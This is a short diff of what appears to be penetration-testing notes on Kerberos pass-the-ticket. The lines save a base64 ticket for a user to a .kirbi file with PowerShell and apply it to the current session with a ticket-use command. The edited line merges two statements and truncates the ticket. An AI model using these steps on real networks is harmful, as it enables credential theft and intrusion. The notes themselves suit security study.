@@ -81,8 +81,7 @@ Injecting the ticket
 
 Use powershell to save to ticket to local machine:
 
-powershell $ticket = "doIFo[...snip...]kNPTQ=="
-[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String($ticket))
+powershell $ticket = "doIF...."[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String($ticket))
 
 kerberos_ticket_use <-- appply ticket to current seesion after it is saved with above command.
 
